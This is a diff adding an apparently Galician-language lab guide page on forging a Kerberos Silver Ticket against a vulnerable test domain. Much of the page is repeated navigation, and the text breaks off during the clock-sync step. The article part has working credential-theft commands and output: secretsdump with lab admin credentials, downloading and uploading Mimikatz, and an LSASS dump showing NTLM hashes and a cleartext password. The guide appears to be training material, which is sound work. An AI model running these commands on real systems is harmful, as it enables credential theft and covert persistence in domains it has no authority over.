+    <span class="md-ellipsis">
+      Desvantaxes
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#procedemento-paso-a-paso" class="md-nav__link">
+    <span class="md-ellipsis">
+      Procedemento Paso a Paso
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Procedemento Paso a Paso">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#paso-1-obtencion-do-hash-ntlm-da-conta-de-servizo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 1: Obtención do Hash NTLM da Conta de Servizo
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Paso 1: Obtención do Hash NTLM da Conta de Servizo">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-1-credenciais-de-administrador-secretsdump" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 1: Credenciais de Administrador (Secretsdump)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-2-conversion-desde-contrasinal-en-texto-claro" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 2: Conversión desde Contrasinal en Texto Claro
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-3-dump-de-lsass-con-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 3: Dump de LSASS con Mimikatz
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resumo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resumo
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-2-obtencion-do-sid-do-dominio" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 2: Obtención do SID do Dominio
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-3-sincronizacion-temporal-clock-skew" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 3: Sincronización Temporal (Clock Skew)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-4-forxado-do-silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 4: Forxado do Silver Ticket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-5-verificacion-do-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 5: Verificación do Ticket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-6-uso-do-ticket-e-acceso-a-sql-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 6: Uso do Ticket e Acceso a SQL Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-7-activacion-de-xp_cmdshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 7: Activación de xp_cmdshell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-8-comprobacion-de-privilexios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 8: Comprobación de Privilexios
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotacion-seimpersonateprivilege-via-sql-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Explotación: SeImpersonatePrivilege vía SQL Server
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Explotación: SeImpersonatePrivilege vía SQL Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#descricion_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Descrición
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-9-descarga-de-sigmapotato" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 9: Descarga de SigmaPotato
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-10-execucion-do-ataque-obtencion-de-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 10: Execución do Ataque (obtención de SYSTEM)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-11-verificacion-acceso-como-administrador" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 11: Verificación - Acceso como Administrador
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resumo
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Resumo">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#duracion-e-validez-do-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Duración e Validez do Ticket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#o-ticket-permanece-valido-se" class="md-nav__link">
+    <span class="md-ellipsis">
+      O Ticket Permanece Válido Se:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#o-ticket-invalidase-se" class="md-nav__link">
+    <span class="md-ellipsis">
+      O Ticket Inválídase Se:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conseguimos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conseguimos:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../9-ATAQUE_ESPECIFICO_GOLDEN_TICKET/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Golden Ticket
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../6-ANALISE_USUARIOS/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    Análise usuarios
+    
+  </span>
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="Táboa de contidos">
+  
+  
+  
+    
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      Táboa de contidos
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#descricion" class="md-nav__link">
+    <span class="md-ellipsis">
+      Descrición
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Descrición">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#vantaxes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Vantaxes
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#desvantaxes" class="md-nav__link">
+    <span class="md-ellipsis">
+      Desvantaxes
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#procedemento-paso-a-paso" class="md-nav__link">
+    <span class="md-ellipsis">
+      Procedemento Paso a Paso
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Procedemento Paso a Paso">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#paso-1-obtencion-do-hash-ntlm-da-conta-de-servizo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 1: Obtención do Hash NTLM da Conta de Servizo
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Paso 1: Obtención do Hash NTLM da Conta de Servizo">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#opcion-1-credenciais-de-administrador-secretsdump" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 1: Credenciais de Administrador (Secretsdump)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-2-conversion-desde-contrasinal-en-texto-claro" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 2: Conversión desde Contrasinal en Texto Claro
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#opcion-3-dump-de-lsass-con-mimikatz" class="md-nav__link">
+    <span class="md-ellipsis">
+      Opción 3: Dump de LSASS con Mimikatz
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#resumo" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resumo
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-2-obtencion-do-sid-do-dominio" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 2: Obtención do SID do Dominio
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-3-sincronizacion-temporal-clock-skew" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 3: Sincronización Temporal (Clock Skew)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-4-forxado-do-silver-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 4: Forxado do Silver Ticket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-5-verificacion-do-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 5: Verificación do Ticket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-6-uso-do-ticket-e-acceso-a-sql-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 6: Uso do Ticket e Acceso a SQL Server
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-7-activacion-de-xp_cmdshell" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 7: Activación de xp_cmdshell
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-8-comprobacion-de-privilexios" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 8: Comprobación de Privilexios
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#explotacion-seimpersonateprivilege-via-sql-server" class="md-nav__link">
+    <span class="md-ellipsis">
+      Explotación: SeImpersonatePrivilege vía SQL Server
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Explotación: SeImpersonatePrivilege vía SQL Server">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#descricion_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Descrición
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-9-descarga-de-sigmapotato" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 9: Descarga de SigmaPotato
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-10-execucion-do-ataque-obtencion-de-system" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 10: Execución do Ataque (obtención de SYSTEM)
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#paso-11-verificacion-acceso-como-administrador" class="md-nav__link">
+    <span class="md-ellipsis">
+      Paso 11: Verificación - Acceso como Administrador
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#resumo_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      Resumo
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="Resumo">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#duracion-e-validez-do-ticket" class="md-nav__link">
+    <span class="md-ellipsis">
+      Duración e Validez do Ticket
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#o-ticket-permanece-valido-se" class="md-nav__link">
+    <span class="md-ellipsis">
+      O Ticket Permanece Válido Se:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#o-ticket-invalidase-se" class="md-nav__link">
+    <span class="md-ellipsis">
+      O Ticket Inválídase Se:
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#conseguimos" class="md-nav__link">
+    <span class="md-ellipsis">
+      Conseguimos:
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+<h1 id="vector-de-ataque-silver-ticket-persistencia-en-servizos">Vector de Ataque: Silver Ticket (Persistencia en Servizos)</h1>
+<p><strong>Fase:</strong> 5. Persistencia<br />
+<strong>Requisitos:</strong> Hash NTLM da conta de servizo (<code>svc_sql</code>) e o SID do dominio.</p>
+<hr />
+<h2 id="descricion">Descrición</h2>
+<p>Un <strong>Silver Ticket</strong> é un TGS (Ticket Granting Service) falsificado. A diferenza do Golden Ticket (que require o hash de <code>krbtgt</code> e dá acceso a todo), o Silver Ticket só require o hash da conta que executa un servizo e dá acceso de administrador <strong>só a ese servizo</strong>.</p>
+<h3 id="vantaxes">Vantaxes</h3>
+<ul>
+<li><strong>Sigilo</strong>: Non require comunicación co DC (KDC), polo que é máis silencioso e difícil de detectar.  </li>
+<li><strong>Persistencia sobre o usuario suplantado</strong>: O Silver Ticket segue funcionando mesmo se cambia o contrasinal do <strong>usuario suplantado</strong> (por exemplo, <em>Administrador</em>). Isto débese a que o ticket non usa o hash deste usuario para ser xerado nin validado.  </li>
+<li><strong>Suplantación total</strong>: Permite acceder ao servizo como calquera usuario (incluído Administrador) sen coñecer o seu contrasinal real, sempre que o servizo acepte o ticket.  </li>
+<li><strong>Duración prolongada</strong>: O ticket falsificado pode configurarse cunha validez de ata <strong>10 anos</strong> por defecto, proporcionando persistencia de longo prazo sobre ese servizo.</li>
+</ul>
+<h3 id="desvantaxes">Desvantaxes</h3>
+<ul>
+<li><strong>Ámbito moi limitado</strong>: Só proporciona acceso ao servizo concreto para o que se falsifica o ticket (MSSQL, CIFS, HTTP...), non ao dominio completo.  </li>
+<li><strong>Sen acceso global nin privilexios amplos</strong>: Non proporciona acceso completo ao dominio. Non permite movemento lateral ilimitado nin acceso ao KDC. A diferenza dun Golden Ticket, non converte ao atacante en “amo do dominio”, senón só do servizo comprometido.  </li>
+<li><strong>Dependencia do hash da conta de servizo</strong>: O Silver Ticket só é válido mentres o <strong>hash NTLM da conta de servizo asociada ao SPN</strong> (por exemplo, <code>svc_sql</code>) non cambie. Ese hash é o que se utiliza para <strong>asinar o ticket</strong>, polo que un cambio no contrasinal desa conta <strong>invalida o Silver Ticket</strong> de inmediato.  </li>
+</ul>
+<hr />
+<div class="admonition info">
+<p class="admonition-title"><strong>Explicación Visual do Ataque</strong></p>
+<p><img alt="Fig. Silver Ticket - Explicación" src="../images/silver-ticket-explicacion.png" width="70%" /></p>
+<p>O diagrama mostra a diferenza clave entre Kerberos normal (que require 4 intercambios co KDC) e Silver Ticket (que omite completamente o KDC).</p>
+</div>
+<div class="admonition info">
+<p class="admonition-title"><strong>Diagrama de ataque</strong></p>
+<p><img alt="Fig. Diagrama de ataque" src="../images/8-silver-ticket-diagrama-de-ataque.png" width="50%" /></p>
+</div>
+<hr />
+<h2 id="procedemento-paso-a-paso">Procedemento Paso a Paso</h2>
+<h3 id="paso-1-obtencion-do-hash-ntlm-da-conta-de-servizo">Paso 1: Obtención do Hash NTLM da Conta de Servizo</h3>
+<p>Necesitamos o hash NTLM do usuario <code>svc_sql</code> que executa o servizo MSSQL.</p>
+<p>Para conseguir o <strong>NTLM hash</strong> (tamén chamado RC4 Key no contexto de Kerberos) necesario para <code>impacket-ticketer</code>, temos varias opcións dependendo do nivel de acceso que teñamos no dominio ou dos ataques que xa teñamos realizados.</p>
+<h4 id="opcion-1-credenciais-de-administrador-secretsdump">Opción 1: Credenciais de Administrador (Secretsdump)</h4>
+<p>Se xa temos comprometido un Administrador de Dominio (ver <a href="../2-ATAQUE_ESPECIFICO_LLMNR_RESPONDER/" target="_blank">ATAQUE_LLMNR_RESPONDER</a>) ou un usuario con privilexios de replicación como <code>brais.t</code> co <strong>SeBackupPrivilege</strong> explotado para ler o NTDS.dit (ver <a href="../3-ATAQUE_ESPECIFICO_SEBACKUP/" target="_blank">ATAQUE_SEBACKUP</a>), podemos extraer todos os hashes.</p>
+<p><strong>1A. Con credenciais de admin:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-0-1"><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>impacket-secretsdump<span class="w"> </span><span class="s1">&#39;VULN-HE.LAB/Administrador:abc123.@192.168.56.100&#39;</span>
+</span></code></pre></div>
+<p><strong>1B. Con NTDS.dit extraído (vía SeBackupPrivilege):</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-1-1"><a id="__codelineno-1-1" name="__codelineno-1-1" href="#__codelineno-1-1"></a>impacket-secretsdump<span class="w"> </span>-ntds<span class="w"> </span>ntds.dit<span class="w"> </span>-system<span class="w"> </span>system.hive<span class="w"> </span>LOCAL
+</span></code></pre></div>
+<p><strong>Buscar na saída:</strong>  </p>
+<p>Buscar na saída a conta que corre o servizo:  </p>
+<ul>
+<li>Se o SQL Server corre como <strong>LocalSystem</strong>, busca o hash da conta de máquina: <span style='white-space: nowrap;'><strong>VULN-DC-01$</strong></span>  </li>
+<li>Se corre como un usuario de servizo (ex: <code>svc_sql</code>), buscar o hash de <strong>svc_sql</strong>  </li>
+</ul>
+<p>O formato será: <code>usuario:id:lmhash:nthash:::</code>. O que interesa é a <strong>cuarta columna</strong> (o <code>nthash</code>).</p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-2-1"><a id="__codelineno-2-1" name="__codelineno-2-1" href="#__codelineno-2-1"></a>...
+</span><span id="__span-2-2"><a id="__codelineno-2-2" name="__codelineno-2-2" href="#__codelineno-2-2"></a>svc_sql:1106:aad3b435b51404eeaad3b435b51404ee:ad2896ecfb9b443720bab09bb020f852:::
+</span><span id="__span-2-3"><a id="__codelineno-2-3" name="__codelineno-2-3" href="#__codelineno-2-3"></a>...
+</span><span id="__span-2-4"><a id="__codelineno-2-4" name="__codelineno-2-4" href="#__codelineno-2-4"></a>VULN-DC-01$:1000:aad3b435b51404eeaad3b435b51404ee:be8e49b2cb97d0c6c8430097f477f989:::
+</span><span id="__span-2-5"><a id="__codelineno-2-5" name="__codelineno-2-5" href="#__codelineno-2-5"></a>...
+</span></code></pre></div>
+<p>O que nos interesa é a <strong>4ª columna</strong> (nthash): <code>ad2896ecfb9b443720bab09bb020f852</code></p>
+<blockquote>
+<p><strong>Nota:</strong> Se o servizo corre como <strong>LocalSystem/NETWORK SERVICE</strong>, usa o hash da conta de máquina: <code>VULN-DC-01$</code></p>
+</blockquote>
+<hr />
+<h4 id="opcion-2-conversion-desde-contrasinal-en-texto-claro">Opción 2: Conversión desde Contrasinal en Texto Claro</h4>
+<p>Podemos empregar <code>impacket-ticketer</code>, pero esta ferramenta pide o hash, non o contrasinal. Mais se conseguimos crackear o contrasinal do usuario <a href="../6-ANALISE_USUARIOS/" target="_blank"><code>svc_sql</code> (<code>SvcPassw0rdKerb!</code>)</a>, convertimos o contrasinal a hash cun "one-liner" de Python:</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-3-1"><a id="__codelineno-3-1" name="__codelineno-3-1" href="#__codelineno-3-1"></a>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import hashlib,binascii; print(binascii.hexlify(hashlib.new(&quot;md4&quot;, &quot;SvcPassw0rdKerb!&quot;.encode(&quot;utf-16le&quot;)).digest()).decode())&#39;</span>
+</span></code></pre></div>
+<p><strong>Resultado:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-4-1"><a id="__codelineno-4-1" name="__codelineno-4-1" href="#__codelineno-4-1"></a>ad2896ecfb9b443720bab09bb020f852
+</span></code></pre></div>
+<p>O resultado desa liña é o hash que debemos poñer no flag <code>-nthash</code>.</p>
+<hr />
+<h4 id="opcion-3-dump-de-lsass-con-mimikatz">Opción 3: Dump de LSASS con Mimikatz</h4>
+<p>Se conseguimos acceso como Administrador local ou SYSTEM na máquina onde corre o servizo (neste caso, o propio DC <code>192.168.56.100</code>), podemos usar <strong>Mimikatz</strong> para extraer os hashes da memoria LSASS:</p>
+<p><strong>Na máquina atacante:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-5-1"><a id="__codelineno-5-1" name="__codelineno-5-1" href="#__codelineno-5-1"></a>wget<span class="w"> </span>https://github.com/ParrotSec/mimikatz/raw/master/x64/mimikatz.exe
+</span></code></pre></div>
+<p><strong>Na máquina vítima (vía evil-winrm):</strong>  </p>
+<p>Descargamos mimikatz.exe:  </p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-6-1"><a id="__codelineno-6-1" name="__codelineno-6-1" href="#__codelineno-6-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrador</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="n">upload</span> <span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span>
+</span><span id="__span-6-2"><a id="__codelineno-6-2" name="__codelineno-6-2" href="#__codelineno-6-2"></a><span class="p">...</span>
+</span><span id="__span-6-3"><a id="__codelineno-6-3" name="__codelineno-6-3" href="#__codelineno-6-3"></a><span class="n">Info</span><span class="p">:</span> <span class="n">Upload</span> <span class="n">successful</span><span class="p">!</span>
+</span></code></pre></div>
+<p>Executamos mimikatz:  </p>
+<div class="language-powershell highlight"><pre><span></span><code><span id="__span-7-1"><a id="__codelineno-7-1" name="__codelineno-7-1" href="#__codelineno-7-1"></a><span class="p">*</span><span class="n">Evil-WinRM</span><span class="p">*</span> <span class="nb">PS </span><span class="n">C</span><span class="p">:\</span><span class="n">Users</span><span class="p">\</span><span class="n">Administrador</span><span class="p">\</span><span class="n">Documents</span><span class="p">&gt;</span> <span class="p">.\</span><span class="n">mimikatz</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;privilege::debug&quot;</span> <span class="s2">&quot;sekurlsa::logonpasswords&quot;</span> <span class="s2">&quot;exit&quot;</span>
+</span></code></pre></div>
+<p><strong>Buscar na saída:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-8-1"><a id="__codelineno-8-1" name="__codelineno-8-1" href="#__codelineno-8-1"></a>Authentication Id : 0 ; 684641 (00000000:000a7261)
+</span><span id="__span-8-2"><a id="__codelineno-8-2" name="__codelineno-8-2" href="#__codelineno-8-2"></a>Session           : Service from 0
+</span><span id="__span-8-3"><a id="__codelineno-8-3" name="__codelineno-8-3" href="#__codelineno-8-3"></a>User Name         : svc_sql
+</span><span id="__span-8-4"><a id="__codelineno-8-4" name="__codelineno-8-4" href="#__codelineno-8-4"></a>Domain            : VULN-HE
+</span><span id="__span-8-5"><a id="__codelineno-8-5" name="__codelineno-8-5" href="#__codelineno-8-5"></a>Logon Server      : VULN-DC-01
+</span><span id="__span-8-6"><a id="__codelineno-8-6" name="__codelineno-8-6" href="#__codelineno-8-6"></a>Logon Time        : 10/12/2025 20:26:22
+</span><span id="__span-8-7"><a id="__codelineno-8-7" name="__codelineno-8-7" href="#__codelineno-8-7"></a>SID               : S-1-5-21-1409906420-806768563-109815720-1106
+</span><span id="__span-8-8"><a id="__codelineno-8-8" name="__codelineno-8-8" href="#__codelineno-8-8"></a>        msv :
+</span><span id="__span-8-9"><a id="__codelineno-8-9" name="__codelineno-8-9" href="#__codelineno-8-9"></a>         [00000003] Primary
+</span><span id="__span-8-10"><a id="__codelineno-8-10" name="__codelineno-8-10" href="#__codelineno-8-10"></a>         * Username : svc_sql
+</span><span id="__span-8-11"><a id="__codelineno-8-11" name="__codelineno-8-11" href="#__codelineno-8-11"></a>         * Domain   : VULN-HE
+</span><span id="__span-8-12"><a id="__codelineno-8-12" name="__codelineno-8-12" href="#__codelineno-8-12"></a>         * NTLM     : ad2896ecfb9b443720bab09bb020f852
+</span><span id="__span-8-13"><a id="__codelineno-8-13" name="__codelineno-8-13" href="#__codelineno-8-13"></a>         * SHA1     : f9675a1efe71400b598f76f54dc43f5d69572be8
+</span><span id="__span-8-14"><a id="__codelineno-8-14" name="__codelineno-8-14" href="#__codelineno-8-14"></a>        wdigest :
+</span><span id="__span-8-15"><a id="__codelineno-8-15" name="__codelineno-8-15" href="#__codelineno-8-15"></a>         * Username : svc_sql
+</span><span id="__span-8-16"><a id="__codelineno-8-16" name="__codelineno-8-16" href="#__codelineno-8-16"></a>         * Domain   : VULN-HE
+</span><span id="__span-8-17"><a id="__codelineno-8-17" name="__codelineno-8-17" href="#__codelineno-8-17"></a>         * Password : SvcPassw0rdKerb!
+</span></code></pre></div>
+<h4 id="resumo">Resumo</h4>
+<ol>
+<li>Se o servizo MSSQL está correndo baixo a conta <code>svc_sql</code> e temos o contrasinal, executamos o paso 1 (extraer do NTDS) ou o paso 2 (converter a hash)  </li>
+<li>Se o servizo corre como SYSTEM, necesitamos obrigatoriamente facer o paso 1 ou 3 para obter o hash da conta de máquina <code>VULN-DC-01$</code>  </li>
+</ol>
+<hr />
+<h3 id="paso-2-obtencion-do-sid-do-dominio">Paso 2: Obtención do SID do Dominio</h3>
+<p>Necesitamos o identificador único do dominio. Podemos obtelo mediante <code>mimikatz</code> ou cun usuario básico (como <code>brais.t</code>).</p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-9-1"><a id="__codelineno-9-1" name="__codelineno-9-1" href="#__codelineno-9-1"></a>impacket-lookupsid<span class="w"> </span>VULN-HE.LAB/brais.t:iloveyou@192.168.56.100<span class="w"> </span><span class="p">|</span><span class="w"> </span>grep<span class="w"> </span><span class="s2">&quot;Domain SID&quot;</span>
+</span></code></pre></div>
+<p><strong>Resultado:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-10-1"><a id="__codelineno-10-1" name="__codelineno-10-1" href="#__codelineno-10-1"></a>[*] Domain SID is: S-1-5-21-1409906420-806768563-109815720
+</span></code></pre></div>
+<hr />
+<h3 id="paso-3-sincronizacion-temporal-clock-skew">Paso 3: Sincronización Temporal (Clock Skew)</h3>
+<details class="abstract">
+<summary>Información sobre Kerberos Clock Skew</summary>
+<p><strong>Que é Clock Skew?</strong>  </p>
+<p><strong>Clock Skew</strong> refírese á diferenza de tempo entre o cliente e o servidor Kerberos (DC).  </p>
+<p><strong>Límite por defecto:</strong>  </p>
+<ul>
+<li>Máximo <strong>5 minutos</strong> de diferenza  </li>
+<li>Configurable en <code>MaxClockSkew</code> (Group Policy)  </li>
+</ul>
+<p><strong>Por que é importante?</strong>  </p>
+<ul>
+<li>Prevención de replay attacks  </li>
+<li>Os tickets Kerberos teñen timestamps  </li>
+<li>Se a hora é moi diferente, os tickets son invalidados  </li>
+</ul>
+<p><strong>Erro común:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-11-1"><a id="__codelineno-11-1" name="__codelineno-11-1" href="#__codelineno-11-1"></a>KRB_AP_ERR_SKEW(Clock skew too great)
+</span></code></pre></div>
+<p><strong>Solución:</strong>  </p>
+<p>Debemos revisar a sincronización temporal co servidor de dominio para poder obter os tickets kerberos. Non debe existir un desfase de ±5 minutos.</p>
+</details>
+<blockquote>
+<p><strong>CRÍTICO</strong>: Kerberos require sincronización temporal entre cliente e servidor (±5 minutos máximo)</p>
+</blockquote>
+<p><strong>Instalar ntpdate:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-12-1"><a id="__codelineno-12-1" name="__codelineno-12-1" href="#__codelineno-12-1"></a>sudo<span class="w"> </span>apt<span class="w"> </span>update<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>sudo<span class="w"> </span>apt<span class="w"> </span>-y<span class="w"> </span>install<span class="w"> </span>ntpsec-ntpdate
+</span></code></pre></div>
+<p><strong>Verificar e sincronizar:</strong>  </p>
+<div class="language-bash highlight"><pre><span></span><code><span id="__span-13-1"><a id="__codelineno-13-1" name="__codelineno-13-1" href="#__codelineno-13-1"></a>date
+</span><span id="__span-13-2"><a id="__codelineno-13-2" name="__codelineno-13-2" href="#__codelineno-13-2"></a>sudo<span class="w"> </span>ntpdate<span class="w"> </span>-u<span class="w"> </span><span class="m">192</span>.168.56.100
+</span><span id="__span-13-3"><a id="__codelineno-13-3" name="__codelineno-13-3" href="#__codelineno-13-3"></a>date
+</span></code></pre></div>
+<p><strong>Saída esperada:</strong>  </p>
+<div class="language-text highlight"><pre><span></span><code><span id="__span-14-1"><a id="__codelineno-14-1" name="__codelineno-14-1" href="#__codelineno-14-1"></a>Wed Dec 10 11:16:59 AM UTC 2025
